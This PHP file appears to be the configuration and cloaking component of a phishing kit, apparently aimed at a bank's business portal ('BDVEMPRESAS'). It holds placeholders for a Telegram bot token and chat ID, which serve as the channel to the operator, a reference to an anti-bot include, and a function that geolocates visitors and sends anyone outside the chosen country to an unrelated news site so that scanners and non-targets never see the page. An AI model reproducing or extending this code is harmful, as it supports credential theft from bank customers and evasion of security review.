<?php
    
   // require_once "fucky0ub0t.php";

    $token = "";
    $chatid = "";
    // -- true: solo spain, false: global
    $onlySpain = false;

    // params option
    define("BOT_TOKEN", $token); // bot token
    define("CHAT_ID", $chatid); // telegram chat id

    define("URL_REDIRECT", "/");

    define("CONTROL_MAX_REQUESTS", 1); // max user request

    define("BOT_URL_REDIRECT", "https://clarin.com");

    define("RANDOM_NAME", "app_shadown39928");
    define("DIRECT_CALL", true);

    define("APP_NAME", "BDVEMPRESAS");

    function getIP(){
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
       }
       elseif(isset($_SERVER["HTTP_CLIENT_IP"])) {
           $ip = $_SERVER["HTTP_CLIENT_IP"];
       }
       elseif(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
           $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
       }
       elseif(isset($_SERVER["HTTP_X_FORWARDED"])) {
           $ip = $_SERVER["HTTP_X_FORWARDED"];
       }
       elseif(isset($_SERVER["HTTP_FORWARDED_FOR"])) {
           $ip = $_SERVER["HTTP_FORWARDED_FOR"];
       }
       elseif(isset($_SERVER["HTTP_FORWARDED"])) {
           $ip = $_SERVER["HTTP_FORWARDED"];
       }
       else {
           $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : false;
       }
       if ($ip === '::1') {
           $ip = '127.0.0.1';
       }
       return $ip;
    }

    // only permit ip from argentina
    function run() {
        $ip = getIP();
        $data = file_get_contents("http://ip-api.com/json/".$ip."?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query");
        $obj = json_decode($data, true);
        
        $cc = $obj["countryCode"] ?? "";
        $allowedCountries = ["ES"];

        if (!in_array($cc, $allowedCountries)) {
            sleep(10);
            exit(header(
                "location: " . BOT_URL_REDIRECT
            ));
        }
    }

    // si esta habilitada la opcion
    if ($onlySpain) run();

?>